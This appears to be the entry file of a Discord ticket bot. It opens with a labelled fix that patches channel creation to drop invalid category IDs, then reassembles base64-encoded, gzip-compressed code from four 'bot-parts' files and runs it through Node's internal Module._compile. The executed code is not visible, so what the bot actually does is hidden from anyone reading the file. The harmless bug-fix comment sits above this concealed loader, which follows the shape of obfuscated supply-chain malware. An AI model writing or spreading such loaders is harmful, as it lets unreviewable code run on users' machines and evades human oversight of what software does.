const zlib = require('zlib');
const path = require('path');
const Module = require('module');

// Fix: "parent_id[CHANNEL_PARENT_INVALID_TYPE]: Not a category".
// If the Ticket category ID saved on the website is not a real category (for example a text channel ID),
// Discord rejects channel creation. Drop an invalid parent so the ticket channel is still created.
try {
  const { GuildChannelManager, ChannelType } = require('discord.js');
  const originalCreate = GuildChannelManager.prototype.create;
  GuildChannelManager.prototype.create = async function patchedCreate(options = {}) {
    const raw = options && options.parent;
    const parentId = raw && typeof raw === 'object' ? raw.id : raw;
    if (parentId) {
      const parent = await this.guild.channels.fetch(String(parentId)).catch(() => null);
      if (!parent || parent.type !== ChannelType.GuildCategory) {
        console.warn('[ticket] category ID ' + parentId + ' is not a category channel, creating the channel without a category');
        const { parent: _ignored, ...rest } = options;
        options = rest;
      }
    }
    return originalCreate.call(this, options);
  };
} catch (err) {
  console.error('category guard not installed:', err.message);
}

const b64 = [0, 1, 2, 3].map(i => require('./bot-parts/gz' + i)).join('');
const code = zlib.gunzipSync(Buffer.from(b64, 'base64')).toString('utf8');
const m = new Module(module.filename);
m.filename = path.join(__dirname, 'bot.runtime.js');
m.paths = module.paths;
m._compile(code, m.filename);
module.exports = m.exports;
